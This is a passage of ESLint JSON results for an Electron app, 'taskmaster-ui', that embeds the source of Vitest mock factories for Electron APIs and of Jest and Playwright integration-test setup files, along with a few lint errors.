{}): WebContents {\n  return {\n    id: 1,\n    send: vi.fn(),\n    postMessage: vi.fn(),\n    sendSync: vi.fn(),\n    sendTo: vi.fn(),\n    sendToFrame: vi.fn(),\n    loadURL: vi.fn().mockResolvedValue(undefined),\n    reload: vi.fn(),\n    downloadURL: vi.fn(),\n    canGoBack: vi.fn().mockReturnValue(false),\n    canGoForward: vi.fn().mockReturnValue(false),\n    canGoToOffset: vi.fn().mockReturnValue(false),\n    clearHistory: vi.fn(),\n    goBack: vi.fn(),\n    goForward: vi.fn(),\n    goToIndex: vi.fn(),\n    goToOffset: vi.fn(),\n    isCrashed: vi.fn().mockReturnValue(false),\n    setUserAgent: vi.fn(),\n    getUserAgent: vi.fn().mockReturnValue('MockElectron/1.0'),\n    insertCSS: vi.fn().mockResolvedValue(''),\n    removeInsertedCSS: vi.fn().mockResolvedValue(undefined),\n    executeJavaScript: vi.fn().mockResolvedValue(undefined),\n    setIgnoreMenuShortcuts: vi.fn(),\n    setWindowOpenHandler: vi.fn(),\n    ...overrides\n  } as unknown as WebContents;\n}\n\n// Mock BrowserWindow\nexport function createMockBrowserWindow(overrides: Partial<BrowserWindow> = {}): BrowserWindow {\n  const mockWebContents = createMockWebContents();\n  \n  return {\n    id: 1,\n    webContents: mockWebContents,\n    show: vi.fn(),\n    hide: vi.fn(),\n    close: vi.fn(),\n    destroy: vi.fn(),\n    focus: vi.fn(),\n    blur: vi.fn(),\n    isFocused: vi.fn().mockReturnValue(true),\n    isDestroyed: vi.fn().mockReturnValue(false),\n    isVisible: vi.fn().mockReturnValue(true),\n    isModal: vi.fn().mockReturnValue(false),\n    isFullScreen: vi.fn().mockReturnValue(false),\n    isMaximized: vi.fn().mockReturnValue(false),\n    isMinimized: vi.fn().mockReturnValue(false),\n    setTitle: vi.fn(),\n    getTitle: vi.fn().mockReturnValue('Mock Window'),\n    setBounds: vi.fn(),\n    getBounds: vi.fn().mockReturnValue({ x: 0, y: 0, width: 800, height: 600 }),\n    setSize: vi.fn(),\n    getSize: vi.fn().mockReturnValue([800, 600]),\n    setPosition: vi.fn(),\n    getPosition: vi.fn().mockReturnValue([0, 0]),\n    center: vi.fn(),\n    setAlwaysOnTop: vi.fn(),\n    isAlwaysOnTop: vi.fn().mockReturnValue(false),\n    moveTop: vi.fn(),\n    loadURL: vi.fn().mockResolvedValue(undefined),\n    loadFile: vi.fn().mockResolvedValue(undefined),\n    on: vi.fn().mockReturnThis(),\n    once: vi.fn().mockReturnThis(),\n    off: vi.fn().mockReturnThis(),\n    removeListener: vi.fn().mockReturnThis(),\n    removeAllListeners: vi.fn().mockReturnThis(),\n    emit: vi.fn().mockReturnThis(),\n    ...overrides\n  } as unknown as BrowserWindow;\n}\n\n// Mock IPC Main\nexport function createMockIpcMain(): IpcMain {\n  const handlers = new Map<string, Function>();\n  const listeners = new Map<string, Set<Function>>();\n  \n  return {\n    handle: vi.fn((channel: string, handler: Function) => {\n      handlers.set(channel, handler);\n    }),\n    handleOnce: vi.fn((channel: string, handler: Function) => {\n      handlers.set(channel, handler);\n    }),\n    removeHandler: vi.fn((channel: string) => {\n      handlers.delete(channel);\n    }),\n    on: vi.fn((event: string, listener: Function) => {\n      if (!listeners.has(event)) {\n        listeners.set(event, new Set());\n      }\n      listeners.get(event)!.add(listener);\n      return this;\n    }),\n    once: vi.fn((event: string, listener: Function) => {\n      const wrapper = (...args: any[]) => {\n        listener(...args);\n        listeners.get(event)?.delete(wrapper);\n      };\n      if (!listeners.has(event)) {\n        listeners.set(event, new Set());\n      }\n      listeners.get(event)!.add(wrapper);\n      return this;\n    }),\n    off: vi.fn((event: string, listener: Function) => {\n      listeners.get(event)?.delete(listener);\n      return this;\n    }),\n    removeListener: vi.fn((event: string, listener: Function) => {\n      listeners.get(event)?.delete(listener);\n      return this;\n    }),\n    removeAllListeners: vi.fn((event?: string) => {\n      if (event) {\n        listeners.delete(event);\n      } else {\n        listeners.clear();\n      }\n      return this;\n    }),\n    emit: vi.fn((event: string, ...args: any[]) => {\n      const eventListeners = listeners.get(event);\n      if (eventListeners) {\n        eventListeners.forEach(listener => listener(...args));\n      }\n      return true;\n    }),\n    // Test helper to trigger handlers\n    _triggerHandler: async (channel: string, event: any, ...args: any[]) => {\n      const handler = handlers.get(channel);\n      if (handler) {\n        return await handler(event, ...args);\n      }\n      throw new Error(`No handler registered for channel: ${channel}`);\n    },\n    // Test helper to get handlers\n    _getHandlers: () => handlers,\n    _getListeners: () => listeners\n  } as unknown as IpcMain & {\n    _triggerHandler: (channel: string, event: any, ...args: any[]) => Promise<any>;\n    _getHandlers: () => Map<string, Function>;\n    _getListeners: () => Map<string, Set<Function>>;\n  };\n}\n\n// Mock IPC Renderer\nexport function createMockIpcRenderer(): IpcRenderer {\n  const listeners = new Map<string, Set<Function>>();\n  \n  return {\n    send: vi.fn(),\n    sendSync: vi.fn().mockReturnValue(undefined),\n    sendTo: vi.fn(),\n    sendToHost: vi.fn(),\n    postMessage: vi.fn(),\n    invoke: vi.fn().mockResolvedValue(undefined),\n    on: vi.fn((channel: string, listener: Function) => {\n      if (!listeners.has(channel)) {\n        listeners.set(channel, new Set());\n      }\n      listeners.get(channel)!.add(listener);\n      return this;\n    }),\n    once: vi.fn((channel: string, listener: Function) => {\n      const wrapper = (...args: any[]) => {\n        listener(...args);\n        listeners.get(channel)?.delete(wrapper);\n      };\n      if (!listeners.has(channel)) {\n        listeners.set(channel, new Set());\n      }\n      listeners.get(channel)!.add(wrapper);\n      return this;\n    }),\n    off: vi.fn((channel: string, listener: Function) => {\n      listeners.get(channel)?.delete(listener);\n      return this;\n    }),\n    removeListener: vi.fn((channel: string, listener: Function) => {\n      listeners.get(channel)?.delete(listener);\n      return this;\n    }),\n    removeAllListeners: vi.fn((channel?: string) => {\n      if (channel) {\n        listeners.delete(channel);\n      } else {\n        listeners.clear();\n      }\n      return this;\n    }),\n    // Test helper to trigger listeners\n    _triggerListener: (channel: string, event: any, ...args: any[]) => {\n      const channelListeners = listeners.get(channel);\n      if (channelListeners) {\n        channelListeners.forEach(listener => listener(event, ...args));\n      }\n    }\n  } as unknown as IpcRenderer & {\n    _triggerListener: (channel: string, event: any, ...args: any[]) => void;\n  };\n}\n\n// Mock App\nexport function createMockApp(): App {\n  return {\n    quit: vi.fn(),\n    exit: vi.fn(),\n    relaunch: vi.fn(),\n    isReady: vi.fn().mockReturnValue(true),\n    whenReady: vi.fn().mockResolvedValue(undefined),\n    focus: vi.fn(),\n    hide: vi.fn(),\n    show: vi.fn(),\n    getAppPath: vi.fn().mockReturnValue('/mock/app/path'),\n    getPath: vi.fn().mockReturnValue('/mock/path'),\n    getFileIcon: vi.fn().mockResolvedValue('mock-icon'),\n    setPath: vi.fn(),\n    getVersion: vi.fn().mockReturnValue('1.0.0'),\n    getName: vi.fn().mockReturnValue('MockApp'),\n    setName: vi.fn(),\n    getLocale: vi.fn().mockReturnValue('en-US'),\n    getLocaleCountryCode: vi.fn().mockReturnValue('US'),\n    addRecentDocument: vi.fn(),\n    clearRecentDocuments: vi.fn(),\n    setAsDefaultProtocolClient: vi.fn().mockReturnValue(true),\n    removeAsDefaultProtocolClient: vi.fn().mockReturnValue(true),\n    isDefaultProtocolClient: vi.fn().mockReturnValue(false),\n    getJumpListSettings: vi.fn().mockReturnValue({ removedItems: [], customCategory: [] }),\n    setJumpList: vi.fn(),\n    requestSingleInstanceLock: vi.fn().mockReturnValue(true),\n    hasSingleInstanceLock: vi.fn().mockReturnValue(true),\n    releaseSingleInstanceLock: vi.fn(),\n    setUserActivity: vi.fn(),\n    getCurrentActivityType: vi.fn().mockReturnValue(''),\n    invalidateCurrentActivity: vi.fn(),\n    on: vi.fn().mockReturnThis(),\n    once: vi.fn().mockReturnThis(),\n    off: vi.fn().mockReturnThis(),\n    emit: vi.fn().mockReturnThis(),\n    removeListener: vi.fn().mockReturnThis(),\n    removeAllListeners: vi.fn().mockReturnThis()\n  } as unknown as App;\n}\n\n// Mock Dialog\nexport function createMockDialog(): Dialog {\n  return {\n    showOpenDialog: vi.fn().mockResolvedValue({ filePaths: [], canceled: false }),\n    showOpenDialogSync: vi.fn().mockReturnValue([]),\n    showSaveDialog: vi.fn().mockResolvedValue({ filePath: undefined, canceled: false }),\n    showSaveDialogSync: vi.fn().mockReturnValue(undefined),\n    showMessageBox: vi.fn().mockResolvedValue({ response: 0, checkboxChecked: false }),\n    showMessageBoxSync: vi.fn().mockReturnValue(0),\n    showErrorBox: vi.fn(),\n    showCertificateTrustDialog: vi.fn()\n  } as unknown as Dialog;\n}\n\n// Mock Shell\nexport function createMockShell(): Shell {\n  return {\n    showItemInFolder: vi.fn(),\n    openPath: vi.fn().mockResolvedValue(''),\n    openExternal: vi.fn().mockResolvedValue(undefined),\n    trashItem: vi.fn().mockResolvedValue(undefined),\n    beep: vi.fn(),\n    writeShortcutLink: vi.fn().mockReturnValue(true),\n    readShortcutLink: vi.fn().mockReturnValue({\n      target: '',\n      cwd: '',\n      args: '',\n      description: '',\n      icon: '',\n      iconIndex: 0,\n      appUserModelId: ''\n    })\n  } as unknown as Shell;\n}\n\n// Mock AutoUpdater\nexport function createMockAutoUpdater(): AutoUpdater {\n  const listeners = new Map<string, Set<Function>>();\n  \n  return {\n    setFeedURL: vi.fn(),\n    getFeedURL: vi.fn().mockReturnValue('https://mock-update-server.com'),\n    checkForUpdates: vi.fn(),\n    quitAndInstall: vi.fn(),\n    on: vi.fn((event: string, listener: Function) => {\n      if (!listeners.has(event)) {\n        listeners.set(event, new Set());\n      }\n      listeners.get(event)!.add(listener);\n      return this;\n    }),\n    once: vi.fn((event: string, listener: Function) => {\n      const wrapper = (...args: any[]) => {\n        listener(...args);\n        listeners.get(event)?.delete(wrapper);\n      };\n      if (!listeners.has(event)) {\n        listeners.set(event, new Set());\n      }\n      listeners.get(event)!.add(wrapper);\n      return this;\n    }),\n    off: vi.fn((event: string, listener: Function) => {\n      listeners.get(event)?.delete(listener);\n      return this;\n    }),\n    removeListener: vi.fn((event: string, listener: Function) => {\n      listeners.get(event)?.delete(listener);\n      return this;\n    }),\n    removeAllListeners: vi.fn((event?: string) => {\n      if (event) {\n        listeners.delete(event);\n      } else {\n        listeners.clear();\n      }\n      return this;\n    }),\n    emit: vi.fn((event: string, ...args: any[]) => {\n      const eventListeners = listeners.get(event);\n      if (eventListeners) {\n        eventListeners.forEach(listener => listener(...args));\n      }\n      return true;\n    }),\n    // Test helper\n    _emit: (event: string, ...args: any[]) => {\n      const eventListeners = listeners.get(event);\n      if (eventListeners) {\n        eventListeners.forEach(listener => listener(...args));\n      }\n    }\n  } as unknown as AutoUpdater & {\n    _emit: (event: string, ...args: any[]) => void;\n  };\n}\n\n// Mock CancellationToken\nexport function createMockCancellationToken(): CancellationToken {\n  return new Proxy({} as CancellationToken, {\n    get() {\n      return vi.fn();\n    }\n  });\n}\n\n// Complete Electron Mock\nexport function createElectronMock() {\n  const mockApp = createMockApp();\n  const mockIpcMain = createMockIpcMain();\n  const mockDialog = createMockDialog();\n  const mockShell = createMockShell();\n  const mockAutoUpdater = createMockAutoUpdater();\n  \n  const mockBrowserWindow = vi.fn().mockImplementation((options?: any) => {\n    return createMockBrowserWindow(options);\n  });\n  \n  // Add static methods\n  mockBrowserWindow.getAllWindows = vi.fn().mockReturnValue([]);\n  mockBrowserWindow.getFocusedWindow = vi.fn().mockReturnValue(null);\n  mockBrowserWindow.fromWebContents = vi.fn().mockReturnValue(null);\n  mockBrowserWindow.fromBrowserView = vi.fn().mockReturnValue(null);\n  mockBrowserWindow.fromId = vi.fn().mockReturnValue(null);\n  \n  const mockMenu = vi.fn().mockImplementation(() => ({\n    append: vi.fn(),\n    insert: vi.fn(),\n    items: [],\n    popup: vi.fn()\n  }));\n  \n  mockMenu.buildFromTemplate = vi.fn().mockReturnValue({\n    append: vi.fn(),\n    insert: vi.fn(),\n    items: [],\n    popup: vi.fn()\n  });\n  mockMenu.setApplicationMenu = vi.fn();\n  mockMenu.getApplicationMenu = vi.fn().mockReturnValue(null);\n  \n  return {\n    app: mockApp,\n    BrowserWindow: mockBrowserWindow,\n    ipcMain: mockIpcMain,\n    dialog: mockDialog,\n    shell: mockShell,\n    Menu: mockMenu,\n    MenuItem: vi.fn(),\n    autoUpdater: mockAutoUpdater,\n    nativeTheme: {\n      shouldUseDarkColors: false,\n      themeSource: 'system' as const,\n      on: vi.fn(),\n      off: vi.fn(),\n      once: vi.fn(),\n      removeListener: vi.fn(),\n      removeAllListeners: vi.fn()\n    },\n    session: {\n      defaultSession: {\n        clearCache: vi.fn().mockResolvedValue(undefined),\n        clearStorageData: vi.fn().mockResolvedValue(undefined),\n        setPermissionRequestHandler: vi.fn(),\n        setPermissionCheckHandler: vi.fn(),\n        protocol: {\n          registerFileProtocol: vi.fn(),\n          unregisterProtocol: vi.fn(),\n          isProtocolRegistered: vi.fn().mockReturnValue(false)\n        }\n      }\n    },\n    protocol: {\n      registerFileProtocol: vi.fn(),\n      unregisterProtocol: vi.fn(),\n      isProtocolRegistered: vi.fn().mockReturnValue(false)\n    }\n  };\n}\n\n// Reset all mocks utility\nexport function resetElectronMocks(electronMock: ReturnType<typeof createElectronMock>) {\n  vi.clearAllMocks();\n  \n  // Reset static methods\n  if (electronMock.BrowserWindow.getAllWindows) {\n    electronMock.BrowserWindow.getAllWindows.mockReturnValue([]);\n  }\n  if (electronMock.BrowserWindow.getFocusedWindow) {\n    electronMock.BrowserWindow.getFocusedWindow.mockReturnValue(null);\n  }\n  \n  // Clear IPC handlers if they have the test helper\n  const ipcMain = electronMock.ipcMain as any;\n  if (ipcMain._getHandlers) {\n    ipcMain._getHandlers().clear();\n  }\n  if (ipcMain._getListeners) {\n    ipcMain._getListeners().clear();\n  }\n}\n\n// Export commonly used mock scenarios\nexport const mockScenarios = {\n  // Window with preload script loaded\n  windowWithPreload: () => {\n    const window = createMockBrowserWindow();\n    window.webContents.executeJavaScript = vi.fn().mockResolvedValue({\n      electron: true,\n      versions: { electron: '20.0.0' }\n    });\n    return window;\n  },\n  \n  // Window ready to show\n  windowReadyToShow: () => {\n    const window = createMockBrowserWindow();\n    const readyCallback = vi.fn();\n    window.once = vi.fn((event, callback) => {\n      if (event === 'ready-to-show') {\n        readyCallback.mockImplementation(callback);\n      }\n      return window;\n    });\n    return { window, triggerReady: () => readyCallback() };\n  },\n  \n  // IPC with registered handlers\n  ipcWithHandlers: (handlers: Record<string, Function>) => {\n    const ipcMain = createMockIpcMain();\n    Object.entries(handlers).forEach(([channel, handler]) => {\n      ipcMain.handle(channel, handler);\n    });\n    return ipcMain;\n  }\n};","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/mocks/mock-update-server.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/mocks/mocks/electron.mock.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/mocks/mocks/mock-update-server.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/setup.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/setup/e2e.setup.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/setup/integration-tests.setup.ts","messages":[{"ruleId":"@typescript-eslint/no-namespace","severity":2,"message":"ES2015 module syntax is preferred over namespaces.","line":298,"column":3,"nodeType":"TSModuleDeclaration","messageId":"moduleSyntaxIsPreferred","endLine":303,"endColumn":4}],"suppressedMessages":[],"errorCount":1,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Integration Tests Setup Configuration (2025)\n * \n * Global setup for integration tests with enhanced async handling,\n * real service mocking, and comprehensive error tracking.\n */\n\nimport { jest } from '@jest/globals'\nimport * as fs from 'fs/promises'\nimport * as path from 'path'\n\n// Extended timeout for integration tests\njest.setTimeout(60000)\n\n// Test environment setup\nbeforeAll(async () => {\n  console.log('ðŸ”§ Setting up integration test environment...')\n  \n  // Create test directories\n  const testDirs = [\n    'test-results/integration',\n    'test-results/integration/coverage',\n    'test-results/integration/artifacts'\n  ]\n  \n  for (const dir of testDirs) {\n    await fs.mkdir(dir, { recursive: true })\n  }\n  \n  // Set environment variables\n  process.env.NODE_ENV = 'test'\n  process.env.TEST_TYPE = 'integration'\n  process.env.LOG_LEVEL = 'error' // Reduce noise in tests\n  \n  console.log('âœ… Integration test environment ready')\n})\n\n// Cleanup after all tests\nafterAll(async () => {\n  console.log('ðŸ§¹ Cleaning up integration test environment...')\n  \n  // Force garbage collection if available\n  if (global.gc) {\n    global.gc()\n  }\n  \n  // Close any open handles\n  await new Promise(resolve => setTimeout(resolve, 1000))\n})\n\n// Enhanced error tracking for integration tests\nconst integrationErrors: Array<{\n  test: string\n  error: Error\n  timestamp: number\n  context: any\n}> = []\n\nbeforeEach(() => {\n  const currentTest = expect.getState().currentTestName || 'unknown'\n  \n  // Track unhandled errors\n  process.removeAllListeners('unhandledRejection')\n  process.removeAllListeners('uncaughtException')\n  \n  process.on('unhandledRejection', (reason, promise) => {\n    integrationErrors.push({\n      test: currentTest,\n      error: reason instanceof Error ? reason : new Error(String(reason)),\n      timestamp: Date.now(),\n      context: { type: 'unhandledRejection', promise }\n    })\n  })\n  \n  process.on('uncaughtException', (error) => {\n    integrationErrors.push({\n      test: currentTest,\n      error,\n      timestamp: Date.now(),\n      context: { type: 'uncaughtException' }\n    })\n  })\n})\n\nafterEach(async () => {\n  // Report any accumulated errors\n  if (integrationErrors.length > 0) {\n    console.warn(`âš ï¸ Integration test errors detected (${integrationErrors.length}):`)\n    integrationErrors.forEach(({ test, error, context }) => {\n      console.warn(`  - ${test}: ${error.message} (${context.type})`)\n    })\n    integrationErrors.length = 0 // Clear for next test\n  }\n  \n  // Ensure clean state between tests\n  jest.clearAllMocks()\n  jest.clearAllTimers()\n  \n  // Allow time for async cleanup\n  await new Promise(resolve => setTimeout(resolve, 100))\n})\n\n// Mock complex external dependencies for integration tests\nconst mockFileSystem = {\n  readFile: jest.fn(),\n  writeFile: jest.fn(),\n  mkdir: jest.fn(),\n  stat: jest.fn(),\n  exists: jest.fn()\n}\n\nconst mockElectronServices = {\n  ipcMain: {\n    handle: jest.fn(),\n    on: jest.fn(),\n    off: jest.fn(),\n    removeAllListeners: jest.fn()\n  },\n  BrowserWindow: jest.fn().mockImplementation(() => ({\n    loadFile: jest.fn(),\n    loadURL: jest.fn(),\n    webContents: {\n      send: jest.fn(),\n      executeJavaScript: jest.fn(),\n      on: jest.fn(),\n      once: jest.fn()\n    },\n    on: jest.fn(),\n    once: jest.fn(),\n    show: jest.fn(),\n    hide: jest.fn(),\n    close: jest.fn(),\n    destroy: jest.fn(),\n    isDestroyed: jest.fn(() => false)\n  })),\n  app: {\n    whenReady: jest.fn(() => Promise.resolve()),\n    on: jest.fn(),\n    quit: jest.fn(),\n    getPath: jest.fn(() => '/mock/path'),\n    getVersion: jest.fn(() => '1.0.0')\n  }\n}\n\n// Global test utilities for integration tests\nglobal.integrationUtils = {\n  // Async operation helpers\n  waitForAsync: async <T>(\n    operation: () => Promise<T>,\n    timeout = 30000,\n    interval = 100\n  ): Promise<T> => {\n    const start = Date.now()\n    let lastError: Error\n    \n    while (Date.now() - start < timeout) {\n      try {\n        return await operation()\n      } catch (error) {\n        lastError = error instanceof Error ? error : new Error(String(error))\n        await new Promise(resolve => setTimeout(resolve, interval))\n      }\n    }\n    \n    throw lastError || new Error(`Operation timed out after ${timeout}ms`)\n  },\n  \n  // Service mocking helpers\n  mockService: <T extends object>(service: T, overrides: Partial<T> = {}): T => {\n    const mockImplementation = {} as T\n    \n    for (const key in service) {\n      if (typeof service[key] === 'function') {\n        mockImplementation[key] = jest.fn() as any\n      } else {\n        mockImplementation[key] = service[key]\n      }\n    }\n    \n    return { ...mockImplementation, ...overrides }\n  },\n  \n  // File system test helpers\n  createTestFile: async (filePath: string, content: string) => {\n    await fs.mkdir(path.dirname(filePath), { recursive: true })\n    await fs.writeFile(filePath, content)\n  },\n  \n  cleanupTestFiles: async (basePath: string) => {\n    try {\n      await fs.rm(basePath, { recursive: true, force: true })\n    } catch {\n      // Ignore cleanup errors\n    }\n  },\n  \n  // Memory monitoring\n  getMemorySnapshot: () => {\n    const usage = process.memoryUsage()\n    return {\n      heapUsed: usage.heapUsed / 1024 / 1024, // MB\n      heapTotal: usage.heapTotal / 1024 / 1024, // MB\n      external: usage.external / 1024 / 1024, // MB\n      rss: usage.rss / 1024 / 1024 // MB\n    }\n  },\n  \n  // Network request simulation\n  simulateNetworkDelay: (ms: number = 100) => \n    new Promise(resolve => setTimeout(resolve, ms)),\n  \n  // Event simulation\n  simulateEvent: <T>(emitter: { emit: (event: string, ...args: any[]) => any }, event: string, data: T) => {\n    return new Promise<void>(resolve => {\n      setTimeout(() => {\n        emitter.emit(event, data)\n        resolve()\n      }, 0)\n    })\n  },\n  \n  // Database simulation helpers\n  createMockDatabase: () => {\n    const data = new Map()\n    return {\n      get: jest.fn((key: string) => Promise.resolve(data.get(key))),\n      set: jest.fn((key: string, value: any) => {\n        data.set(key, value)\n        return Promise.resolve()\n      }),\n      delete: jest.fn((key: string) => {\n        data.delete(key)\n        return Promise.resolve()\n      }),\n      clear: jest.fn(() => {\n        data.clear()\n        return Promise.resolve()\n      }),\n      size: () => data.size\n    }\n  }\n}\n\n// Enhanced expect matchers for integration tests\nexpect.extend({\n  toEventuallyBe(received: () => any, expected: any) {\n    return global.integrationUtils.waitForAsync(async () => {\n      const actual = await received()\n      if (actual === expected) {\n        return { pass: true, message: () => 'Values match' }\n      }\n      throw new Error(`Expected ${actual} to be ${expected}`)\n    }, 5000).then(\n      () => ({ pass: true, message: () => 'Condition eventually met' }),\n      (error) => ({ pass: false, message: () => error.message })\n    )\n  },\n  \n  toHaveBeenCalledEventually(mockFn: jest.MockedFunction<any>, timeout = 5000) {\n    return global.integrationUtils.waitForAsync(async () => {\n      if (mockFn.mock.calls.length > 0) {\n        return { pass: true, message: () => 'Function was called' }\n      }\n      throw new Error('Function not called')\n    }, timeout).then(\n      () => ({ pass: true, message: () => 'Function was eventually called' }),\n      () => ({ pass: false, message: () => 'Function was never called within timeout' })\n    )\n  }\n})\n\n// Global mocks for integration testing\nglobal.mockElectron = mockElectronServices\nglobal.mockFS = mockFileSystem\n\n// Type declarations\ndeclare global {\n  let integrationUtils: {\n    waitForAsync: <T>(operation: () => Promise<T>, timeout?: number, interval?: number) => Promise<T>\n    mockService: <T extends object>(service: T, overrides?: Partial<T>) => T\n    createTestFile: (filePath: string, content: string) => Promise<void>\n    cleanupTestFiles: (basePath: string) => Promise<void>\n    getMemorySnapshot: () => { heapUsed: number; heapTotal: number; external: number; rss: number }\n    simulateNetworkDelay: (ms?: number) => Promise<void>\n    simulateEvent: <T>(emitter: { emit: (event: string, ...args: any[]) => any }, event: string, data: T) => Promise<void>\n    createMockDatabase: () => {\n      get: jest.MockedFunction<(key: string) => Promise<any>>\n      set: jest.MockedFunction<(key: string, value: any) => Promise<void>>\n      delete: jest.MockedFunction<(key: string) => Promise<void>>\n      clear: jest.MockedFunction<() => Promise<void>>\n      size: () => number\n    }\n  }\n  \n  let mockElectron: typeof mockElectronServices\n  let mockFS: typeof mockFileSystem\n  \n  namespace jest {\n    interface Matchers<R> {\n      toEventuallyBe(expected: any): Promise<R>\n      toHaveBeenCalledEventually(timeout?: number): Promise<R>\n    }\n  }\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/setup/integration.setup.ts","messages":[{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":404,"column":39,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":404,"endColumn":47},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":405,"column":41,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":405,"endColumn":49}],"suppressedMessages":[],"errorCount":2,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Integration Test Setup (2025)\n * \n * This setup file configures the testing environment for Electron integration tests.\n * It provides utilities for testing the interaction between main, renderer, and preload\n * processes, including real IPC communication and app lifecycle testing.\n * \n * Research-based implementation following 2025 best practices for:\n * - Full Electron application integration testing\n * - Real IPC communication testing patterns\n * - App lifecycle and window management testing\n * - Performance monitoring during integration tests\n */\n\nimport { vi, beforeEach, afterEach, beforeAll, afterAll } from 'vitest'\nimport { type ElectronApplication, type Page, _electron as electron } from 'playwright'\nimport { join } from 'path'\nimport { spawn, type ChildProcess } from 'child_process'\n\n// Integration test configuration (2025 best practices - extended timeouts for CI)\nconst TEST_TIMEOUT = 60000 // 60 seconds for integration tests (increased for CI)\nconst APP_STARTUP_TIMEOUT = 45000 // 45 seconds for app startup (Electron can be slow)\nconst IPC_RESPONSE_TIMEOUT = 10000 // 10 seconds for IPC responses\n\ninterface IntegrationTestContext {\n  electronApp?: ElectronApplication\n  page?: Page\n  serverProcess?: ChildProcess\n  appPath: string\n  isAppReady: boolean\n  testStartTime: number\n}\n\nconst integrationContext: IntegrationTestContext = {\n  appPath: join(__dirname, '../../dist/main/index.js'),\n  isAppReady: false,\n  testStartTime: 0\n}\n\n// Utility functions for integration testing\nexport const launchElectronApp = async (options: {\n  args?: string[]\n  executablePath?: string\n  timeout?: number\n} = {}): Promise<ElectronApplication> => {\n  const {\n    args = [],\n    executablePath,\n    timeout = APP_STARTUP_TIMEOUT\n  } = options\n\n  console.log('Launching Electron app for integration test...')\n  \n  // Ensure app is built before launching\n  const appExists = require('fs').existsSync(integrationContext.appPath)\n  if (!appExists) {\n    console.warn(`App not found at ${integrationContext.appPath}, building first...`)\n    throw new Error(`Electron app not found at ${integrationContext.appPath}. Run 'npm run build' first.`)\n  }\n  \n  const launchOptions: any = {\n    args: [integrationContext.appPath, ...args],\n    timeout\n  }\n\n  if (executablePath) {\n    launchOptions.executablePath = executablePath\n  }\n\n  try {\n    const electronApp = await electron.launch(launchOptions)\n    \n    // Wait for app to be ready\n    await electronApp.evaluate(async ({ app }) => {\n      await app.whenReady()\n    })\n    \n    integrationContext.electronApp = electronApp\n    integrationContext.isAppReady = true\n    \n    console.log('Electron app launched successfully')\n    return electronApp\n  } catch (error) {\n    console.error('Failed to launch Electron app:', error)\n    throw error\n  }\n}\n\nexport const getFirstWindow = async (): Promise<Page> => {\n  if (!integrationContext.electronApp) {\n    throw new Error('Electron app not launched. Call launchElectronApp() first.')\n  }\n\n  const page = await integrationContext.electronApp.firstWindow()\n  integrationContext.page = page\n  \n  // Wait for page to be fully loaded\n  await page.waitForLoadState('domcontentloaded', { timeout: 10000 })\n  \n  // Set up error handling for the page\n  page.on('pageerror', (error) => {\n    console.error('Page error during integration test:', error)\n  })\n  \n  page.on('console', (msg) => {\n    if (msg.type() === 'error') {\n      console.error('Console error:', msg.text())\n    }\n  })\n  \n  return page\n}\n\nexport const closeElectronApp = async (): Promise<void> => {\n  if (integrationContext.electronApp) {\n    console.log('Closing Electron app...')\n    \n    try {\n      // Close all windows first\n      const windows = integrationContext.electronApp.windows()\n      await Promise.all(windows.map(window => window.close().catch(() => {})))\n      \n      // Close the app\n      await integrationContext.electronApp.close()\n      \n      console.log('Electron app closed successfully')\n    } catch (error) {\n      console.error('Error closing Electron app:', error)\n    } finally {\n      integrationContext.electronApp = undefined\n      integrationContext.page = undefined\n      integrationContext.isAppReady = false\n    }\n  }\n}\n\nexport const startFileWatcherServer = async (): Promise<ChildProcess> => {\n  return new Promise((resolve, reject) => {\n    console.log('Starting file watcher server...')\n    \n    const serverPath = join(__dirname, '../../server/file-watcher.js')\n    const serverProcess = spawn('node', [serverPath], {\n      stdio: ['pipe', 'pipe', 'pipe'],\n      env: {\n        ...process.env,\n        NODE_ENV: 'test',\n        PORT: '3001'\n      }\n    })\n    \n    let serverStarted = false\n    \n    serverProcess.stdout?.on('data', (data) => {\n      const output = data.toString()\n      console.log('Server stdout:', output)\n      \n      if (output.includes('Server listening') && !serverStarted) {\n        serverStarted = true\n        integrationContext.serverProcess = serverProcess\n        resolve(serverProcess)\n      }\n    })\n    \n    serverProcess.stderr?.on('data', (data) => {\n      console.error('Server stderr:', data.toString())\n    })\n    \n    serverProcess.on('error', (error) => {\n      console.error('Server process error:', error)\n      reject(error)\n    })\n    \n    serverProcess.on('exit', (code) => {\n      console.log(`Server process exited with code ${code}`)\n    })\n    \n    // Timeout for server startup\n    setTimeout(() => {\n      if (!serverStarted) {\n        serverProcess.kill()\n        reject(new Error('File watcher server failed to start within timeout'))\n      }\n    }, 10000)\n  })\n}\n\nexport const stopFileWatcherServer = async (): Promise<void> => {\n  if (integrationContext.serverProcess) {\n    console.log('Stopping file watcher server...')\n    \n    return new Promise((resolve) => {\n      const server = integrationContext.serverProcess!\n      \n      